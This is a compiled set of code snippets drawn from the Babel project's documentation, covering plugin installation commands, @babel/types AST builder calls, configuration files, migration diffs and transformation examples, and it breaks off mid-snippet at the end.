Install plugin using npm\nDESCRIPTION: Installs the @babel/plugin-transform-unicode-escapes plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-escapes.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-unicode-escapes\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-new-target - Shell\nDESCRIPTION: Command to install the `@babel/plugin-transform-new-target` Babel plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-new-target\n```\n\n----------------------------------------\n\nTITLE: React Element Deoptimization Example\nDESCRIPTION: Illustrates cases where the plugin does not inline elements and falls back to `React.createElement`, specifically when `ref` or object rest spread is used. This is because those features are not easily inlined.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// The plugin will still use React.createElement when `ref` or `object rest spread` is used\n<Foo ref=\"bar\" />\n<Foo {...bar} />\n```\n\n----------------------------------------\n\nTITLE: JSON Module Import (JavaScript)\nDESCRIPTION: This code shows how to import a JSON module using the `import ... with { type: \"json\" }` syntax. This feature requires the `@babel/plugin-proposal-json-modules` plugin. It's used to load JSON files as modules in JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport myConfig from \"./config.json\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Creating a TSEnumDeclaration Node in JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a `TSEnumDeclaration` AST node using the `t.tsEnumDeclaration` builder.  It takes an identifier and an array of `TSEnumMember` nodes. The node represents a TypeScript enum declaration.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_170\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsEnumDeclaration(id, members);\n```\n\n----------------------------------------\n\nTITLE: Creating a RegExp Literal Node in Babel\nDESCRIPTION: Creates a `RegExpLiteral` AST node using the Babel types module. This node represents a regular expression literal, requiring a pattern and optionally accepting flags.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_145\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.regExpLiteral(pattern, flags);\n```\n\n----------------------------------------\n\nTITLE: Complete Babelify Example via Node API (JavaScript)\nDESCRIPTION: This example shows a complete Browserify setup with Babelify, including error handling and output to a file. It reads a file, transforms it with babelify, bundles it and writes it to bundle.js.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar fs = require(\"fs\");\nvar browserify = require(\"browserify\");\nvar babelify = require(\"babelify\");\n\nbrowserify({ debug: true })\n  .transform(babelify)\n  .require(\"./script.js\", { entry: true })\n  .bundle()\n  .on(\"error\", function (err) { console.log(\"Error: \" + err.message); })\n  .pipe(fs.createWriteStream(\"bundle.js\"));\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-env with bugfixes\nDESCRIPTION: Shows how to enable the `bugfixes` option in `@babel/preset-env` within a Babel configuration file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-env\", {\n      \"targets\": { \"esmodules\": true }, // Use the targets that you was already using\n      \"bugfixes\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Diff: Migrate ESLint Parser Options\nDESCRIPTION: Demonstrates how to migrate the `allowImportExportEverywhere` option from the top-level `parserOptions` to a nested `babelOptions.parserOpts` configuration in the `.eslintrc` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"parser\": \"@babel/eslint-parser\",\n  \"parserOptions\": {\n-   \"allowImportExportEverywhere\": true,\n+   \"babelOptions\": {\n+     \"parserOpts\": {\n+       \"allowImportExportEverywhere\": true\n+     }\n+   }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Create Import Namespace Specifier AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportNamespaceSpecifier` AST node using the `t.importNamespaceSpecifier` builder. This node represents the namespace import specifier (e.g., `import * as name from 'module'`). The parameter is the local identifier for the namespace.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_84\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importNamespaceSpecifier(local);\n```\n\n----------------------------------------\n\nTITLE: Implementing Private Static Accessors in JavaScript\nDESCRIPTION: This code snippet demonstrates the implementation of private static accessors (getters and setters) in a JavaScript class. The private static loader instance is lazily initialized and accessed through the private static getter. This feature requires the `@babel/plugin-proposal-private-methods` plugin or the `stage-3` preset.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-09-05-7.6.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Resource {\n  static #loaderInstance = null;\n\n  static get #loader() {\n    if (!this.#loaderInstance) this.#loaderInstance = new Loader();\n    return this.#loaderInstance;\n  }\n\n  status = null;\n\n  constructor(url) {\n    this.status = Resource.#loader.load(url);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TSIndexSignature Node in JavaScript\nDESCRIPTION: This code snippet shows how to create a `TSIndexSignature` AST node using the `t.tsIndexSignature` builder function. It accepts an array of identifiers (parameters) and a type annotation. This node represents an index signature in a TypeScript type or interface.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_178\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsIndexSignature(parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API - JavaScript\nDESCRIPTION: Shows how to use the `@babel/plugin-transform-new-target` plugin with the Babel Node API. It transforms the provided code string with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-new-target\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installing the ES2015 Preset\nDESCRIPTION: Installs the `babel-preset-es2015` preset as a development dependency using npm. This preset includes a collection of plugins that enable support for various ES2015 features.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-preset-es2015\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectExpression in JavaScript\nDESCRIPTION: This code snippet illustrates how to create an `ObjectExpression` AST node using `t.objectExpression(properties)`.  The `properties` parameter is an array containing `ObjectMethod`, `ObjectProperty`, or `SpreadElement` nodes.  This represents an object literal.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_122\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectExpression(properties);\n```\n\n----------------------------------------\n\nTITLE: Creating an ArgumentPlaceholder Node\nDESCRIPTION: Creates an AST node representing an argument placeholder. There are no parameters. Use `t.isArgumentPlaceholder(node, opts)` to check if a node is an ArgumentPlaceholder and `t.assertArgumentPlaceholder(node, opts)` to assert that a node is an ArgumentPlaceholder.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.argumentPlaceholder();\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-do-expressions\nDESCRIPTION: Installs the @babel/plugin-syntax-do-expressions package as a development dependency using npm or yarn. This allows Babel to parse do expression syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-do-expressions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-do-expressions\n```\n\n----------------------------------------\n\nTITLE: Variance Node Handling\nDESCRIPTION: This code snippet shows how to access the `kind` property of the new `Variance` node instead of directly accessing the `variance` string value. This change affects various AST nodes like `ObjectProperty`, `ObjectMethod`, `AssignmentProperty`, `ClassMethod`, `ClassProperty`, and `Property` when the `flow` plugin is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_14\n\nLANGUAGE: diff\nCODE:\n```\n return {\n   Property({ node }) {\n-    if (node.variance === \"plus\") {\n+    if (node.variance.kind === \"plus\") {\n       ...\n-    } else if (node.variance === \"minus\") {\n+    } else if (node.variance.kind === \"minus\") {\n       ...\n     }\n   }\n };\n```\n\n----------------------------------------\n\nTITLE: Get Compilation Targets - JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the `@babel/helper-compilation-targets` package to normalize compilation targets. It imports the `getTargets` function and uses it to process target options, returning a normalized target object. The example shows how to specify browser and Node.js targets.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport getTargets from \"@babel/helper-compilation-targets\";\n\ngetTargets({\n  browsers: [\"last 2 chrome versions\"],\n  node: 10,\n}) ==\n  {\n    chrome: \"77.0.0\",\n    node: \"10.0.0\",\n  };\n```\n\n----------------------------------------\n\nTITLE: Creating a VariableDeclarator with Babel\nDESCRIPTION: Creates a `VariableDeclarator` AST node using the `t.variableDeclarator` method. This node represents a variable declarator, where `id` is an `LVal` node representing the variable being declared, and `init` is an `Expression` node representing the initial value (optional).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_247\n\nLANGUAGE: javascript\nCODE:\n```\nt.variableDeclarator(id, init);\n```\n\n----------------------------------------\n\nTITLE: Using Object Assign Plugin via Node API\nDESCRIPTION: Example showing how to use the @babel/plugin-transform-object-assign plugin programmatically within a Node.js environment using @babel/core.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-object-assign\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Minified ES2015 Code Example\nDESCRIPTION: This code shows the result of minifying ES2015 code with Babili directly. Babili can directly minify ES2015 code, unlike UglifyJS. This snippet shows the minified output of the ES2015 class example using Babili.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n// ES2015 code -> Babili -> Minified ES2015 Code\nclass a{constructor(b){this.program=b}}new a;\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example Output\nDESCRIPTION: This code snippet shows the JavaScript code after transformation by the @babel/plugin-transform-jscript plugin. The function expression is converted to a self-invoking function with a named function inside and enforces strict mode.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nvar foo = (function() {\n  function bar() {}\n\n  return bar;\n})();\n```\n\n----------------------------------------\n\nTITLE: Invalid AST Example - JavaScript\nDESCRIPTION: This code snippet illustrates an example of an invalid AST structure that would throw an error in Babel due to using a statement (if statement) in place of an expression.  It shows how the `@babel/types` package performs checks to ensure AST validity.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n// foo = if (true) {}\n\nt.assignmentExpression(\n  \"=\",\n  t.identifier(\"foo\"),\n  t.ifStatement(t.booleanLiteral(true), t.blockStatement([]))\n);\n```\n\n----------------------------------------\n\nTITLE: Checking for EnumBody Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is an EnumBody node using the `t.isEnumBody(node)` method in Babel. This method is specific to Flow enums and covers EnumBooleanBody, EnumNumberBody, EnumStringBody, and EnumSymbolBody. The purpose is to determine if a node represents the body of an enum declaration.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_261\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isEnumBody(node);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin External Helpers in babel.config.json\nDESCRIPTION: This JSON configuration enables the `@babel/plugin-external-helpers` Babel plugin within a `babel.config.json` file. This is the recommended method for configuring Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-external-helpers.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-external-helpers\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Metalsmith-Babel Package with npm\nDESCRIPTION: This command installs the metalsmith-babel plugin using npm.  Metalsmith-babel allows using Babel to transpile JavaScript files within a Metalsmith project. It requires Node.js and npm to be installed and configured.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/metalsmith/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install metalsmith-babel\n```\n\n----------------------------------------\n\nTITLE: Transform Regex Literal with DotAll Flag - JavaScript\nDESCRIPTION: Transforms a regular expression literal with the `/s` flag to its equivalent representation. This allows the dot (.) to match newline characters.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n/./s;\n```\n\n----------------------------------------\n\nTITLE: Noop Node Type Removal\nDESCRIPTION: This migration guide explains the removal of the `Noop` node type, suggesting replacement with the appropriate node and advising opening an issue if no alternative is available.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_66\n\n\n\n----------------------------------------\n\nTITLE: Creating Class Declaration (JavaScript)\nDESCRIPTION: Creates a `ClassDeclaration` AST node. This node represents a class declaration, which defines a named class.  Parameters include the identifier (`id`), the superclass (`superClass`), the class body (`body`), and decorators (`decorators`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_22\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classDeclaration(id, superClass, body, decorators);\n```\n\n----------------------------------------\n\nTITLE: Migrating from @babel/highlight - With forceColor\nDESCRIPTION: Illustrates migrating from `@babel/highlight` to `@babel/code-frame` when using the `forceColor` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport highlight from \"@babel/highlight\";\n\nhighlight(text, { forceColor: true });\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport { highlight } from \"@babel/code-frame\";\n\nhighlight(text);\n```\n\n----------------------------------------\n\nTITLE: Install babel-plugin-minify-simplify - Shell\nDESCRIPTION: This command installs the `babel-plugin-minify-simplify` package as a development dependency using npm. It's a prerequisite for using the plugin in a Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-simplify --save-dev\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Regenerator Example (Before)\nDESCRIPTION: Illustrates how generator functions are transformed by Babel without the transform-runtime plugin, relying on a globally included regenerator runtime, polluting the global scope. This example shows the code generated when using a generator function without the `@babel/plugin-transform-runtime` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction* foo() {}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Class Definition\nDESCRIPTION: This JavaScript code defines a simple class `Person`. This will be transformed by Babel to support older browsers.  This example highlights the need for Babel helpers for cross-browser compatibility.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {}\n```\n\n----------------------------------------\n\nTITLE: Evaluate code with babel-node\nDESCRIPTION: Evaluates and executes the provided JavaScript code snippet using babel-node, compiling it with Babel before execution. The code to be executed is passed as a string argument to the -e option.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel-node -e \"class Test { }\"\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-typescript via CLI\nDESCRIPTION: This command line instruction shows how to use the plugin with Babel's CLI. The plugin is passed to the babel command through the --plugins flag, ensuring that Babel can parse TypeScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-typescript.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-typescript script.js\n```\n\n----------------------------------------\n\nTITLE: Install minify-flip-comparisons\nDESCRIPTION: Installs the babel-plugin-minify-flip-comparisons plugin using npm.  The `--save-dev` flag ensures that the plugin is installed as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-flip-comparisons.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-flip-comparisons --save-dev\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm\nDESCRIPTION: This command installs the `@babel/plugin-transform-property-literals` package from npm as a development dependency. It uses npm, and the equivalent yarn command will perform the same installation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install @babel/plugin-transform-property-literals --save-dev\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Smart Pipeline Operator Example\nDESCRIPTION: This snippet demonstrates the Smart pipeline operator. It transforms `person.score` by doubling it, adding 7, and bounding the result between 0 and 100, using the `#` topic reference.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = person.score\n  |> double\n  |> add(7, #)\n  |> boundScore(0, 100, #);\n\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-env with babel-standalone in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use @babel/preset-env as a preset within babel-standalone. It configures the preset with specific targets (browsers) and useBuiltIns option. Babel and @babel/preset-env-standalone must be loaded before using this code.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env-standalone.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nBabel.transform(code, {\n  presets: [\n    [\n      \"@babel/preset-env\",\n      {\n        targets: {\n          browsers: \"last 1 safari version\",\n        },\n        useBuiltIns: \"usage\",\n      },\n    ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Block-Scoped Functions Plugin via Node API (JavaScript)\nDESCRIPTION: This JavaScript code shows how to use the Babel Node API to transform code with the @babel/plugin-transform-block-scoped-functions plugin. The transformSync method is used to apply the plugin to the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoped-functions.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-block-scoped-functions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Importing TransformBabel Task in MSBuild\nDESCRIPTION: This XML snippet imports the TransformBabel task from the React.MSBuild NuGet package. It requires the React.MSBuild package to be installed in the project. The AssemblyFile attribute specifies the location of the React.MSBuild.dll file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/msbuild/usage.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<UsingTask AssemblyFile=\"packages\\React.MSBuild.2.1.0\\React.MSBuild.dll\" TaskName=\"TransformBabel\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring the Babel Plugin\nDESCRIPTION: This JSON snippet shows how to configure the @babel/plugin-bugfix-safari-class-field-initializer-scope in a babel.config.json file. The plugin is added to the \"plugins\" array, enabling it for Babel transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-class-field-initializer-scope.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-bugfix-safari-class-field-initializer-scope\"]\n}\n```\n\n----------------------------------------\n\nTITLE: isIdentifierChar Function Definition\nDESCRIPTION: This TypeScript code defines the `isIdentifierChar` function, which checks if a given Unicode code point can be part of an identifier. It returns `true` if the codepoint can be part of an identifier and `false` otherwise.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nfunction isIdentifierChar(codepoint: number): boolean\n```\n\n----------------------------------------\n\nTITLE: Configuring uncheckedRequire Option (JSON)\nDESCRIPTION: This configuration shows how to enable the `uncheckedRequire` option in `@babel/plugin-proposal-json-modules` within a Babel configuration file (babel.config.json). Enabling this option simplifies the generated CommonJS code for JSON module imports but disables JSON validation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-json-modules\", { \"uncheckedRequire\": true }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript String Keyword\nDESCRIPTION: Creates a TypeScript `string` keyword node in the AST. Represents the `string` type in TypeScript.  It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_205\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsStringKeyword();\n```\n\n----------------------------------------\n\nTITLE: Top-level Await and Ergonomic Brand Checks in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates the use of top-level await and ergonomic brand checks for private fields.  It showcases the new features enabled by default in Babel 7.15.0, allowing developers to use these features without extra configuration. It shows an example of importing from a database and awaiting the connection as well as an example of brand checking for a private field.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as db from \"database\";\n\nawait db.connect(); // top-level await\n\nclass DBConnector {\n  #password;\n  static isConnector(obj) {\n    return #password in obj; // ergonomic brand checks\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming with Babelify via Node API (JavaScript)\nDESCRIPTION: This snippet demonstrates how to use Babelify as a transform within the Browserify Node API. It initializes Browserify with debug mode enabled and applies the Babelify transform.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nbrowserify({ debug: true })\n  .transform(babelify);\n```\n\n----------------------------------------\n\nTITLE: Install Plugin with npm\nDESCRIPTION: Installs the @babel/plugin-transform-react-display-name plugin as a development dependency using npm. This command prepares your project to use the plugin during the Babel compilation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-display-name\n```\n\n----------------------------------------\n\nTITLE: Loose Mode: Method Assignment Example\nDESCRIPTION: Demonstrates a scenario where the 'loose' mode option can cause issues due to how methods are defined on the class prototype.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  set bar() {\n    throw new Error(\"foo!\");\n  }\n}\n\nclass Bar extends Foo {\n  bar() {\n    // will throw an error when this method is defined\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm\nDESCRIPTION: This command installs the @babel/plugin-transform-private-methods plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install @babel/plugin-transform-private-methods --save-dev\n```\n\n----------------------------------------\n\nTITLE: Checking for PatternLike Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a BindingPattern. It uses the `t.isPatternLike(node)` method from Babel's `types` API. This covers nodes such as `ArrayPattern`, `AssignmentPattern`, `Identifier`, `ObjectPattern`, `RestElement`, `TSAsExpression`, `TSNonNullExpression`, `TSSatisfiesExpression`, and `TSTypeAssertion`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_287\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isPatternLike(node);\n```\n\n----------------------------------------\n\nTITLE: Re-exporting a Constant Binding (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates re-exporting a binding from a module. The `constantReexports` assumption allows Babel to directly export the binding as if it were a constant, optimizing the generated code.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport { value } from \"dependency\";\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareModule AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareModule` to create a declare module node in the AST for Flow type annotations. It takes an ID (Identifier or StringLiteral), the BlockStatement representing the module body, and an optional kind ('CommonJS' or 'ES').\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_38\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareModule(id, body, kind);\n```\n\n----------------------------------------\n\nTITLE: Hoisting fixes in `transform-react-constant-elements` - JavaScript\nDESCRIPTION: This example demonstrates how `transform-react-constant-elements` hoists constant React elements defined within variable declarations. It shows that the plugin correctly hoists `_ref2` even when it depends on variables (`bar` and `baz`) declared in the same scope. This improves performance by reducing unnecessary re-creations of the element.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nfunction render() {\n  const bar = \"bar\", renderFoo = () => <foo bar={bar} baz={baz} />, baz = \"baz\";\n\n  return renderFoo();\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\nfunction render() {\n  const bar = \"bar\",\n        renderFoo = () => _ref2,\n        baz = \"baz\",\n        _ref2 = <foo bar={bar} baz={baz} />;\n\n  return renderFoo();\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Parameter Property\nDESCRIPTION: Creates a TypeScript parameter property node in the AST. Represents a constructor parameter with an accessibility modifier (e.g., `public x: number`). Requires the parameter (identifier or assignment pattern). Accessibility, decorators, override and readonly properties are excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_199\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsParameterProperty(parameter);\n```\n\n----------------------------------------\n\nTITLE: Dead Code Elimination Example - Input\nDESCRIPTION: This JavaScript code demonstrates an example input to the babel-plugin-minify-dead-code-elimination plugin. It contains functions with unused variables and a nested unused function. The expected output is shown in the following code snippet.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo() {var x = 1;}\nfunction bar() { var x = f(); }\nfunction baz() {\n  var x = 1;\n  console.log(x);\n  function unused() {\n    return 5;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Qualified Type Identifier Node in Babel\nDESCRIPTION: Creates a `QualifiedTypeIdentifier` AST node using the Babel types module. This node represents a qualified type identifier, composed of an `id` and a `qualification`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_143\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.qualifiedTypeIdentifier(id, qualification);\n```\n\n----------------------------------------\n\nTITLE: Using Numeric Separators in Binary Literals (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates the use of numeric separators in binary literals. It assigns a binary number with separators to a variable and performs a bitwise operation to check a specific bit.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet nibbles = 0b1010_0001_1000_0101;\n\n// Is bit 7 on? It sure is!\n// 0b1010_0001_1000_0101\n//             ^\n//\n// We can double check:\nconsole.log(!!(nibbles & (1 << 7))); // true\n```\n\n----------------------------------------\n\nTITLE: Template Literal (JavaScript)\nDESCRIPTION: This JavaScript code uses a template literal. The `ignoreToPrimitiveHint` assumption tells Babel that the behavior of `[Symbol.toPrimitive]` method of objects does not depend on the `hint` parameter.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet str = `a${foo}b`;\n```\n\n----------------------------------------\n\nTITLE: Configuring Hermes Parser in Babel Preset Flow (JSON)\nDESCRIPTION: This snippet configures the `@babel/preset-flow` to use the experimental Hermes parser.  This is enabled by setting `experimental_useHermesParser` to `true` inside the preset options.  This enables parsing of newer Flow features.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-flow\", {\n      \"experimental_useHermesParser\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform new.target JavaScript\nDESCRIPTION: This plugin transforms the `new.target` meta property to provide information about the constructor being invoked.  The output code demonstrates how `new.target` is handled within class constructors and methods.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\n// with a function\nfunction Foo() {\n  console.log(new.target);\n}\n\nFoo(); // => undefined\nnew Foo(); // => Foo\n\n// with classes\nclass Foo {\n  constructor() {\n    console.log(new.target);\n  }\n}\n\nclass Bar extends Foo {\n}\n\nnew Foo(); // => Foo\nnew Bar(); // => Bar\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    new.target;\n  }\n\n  test() {\n    new.target;\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    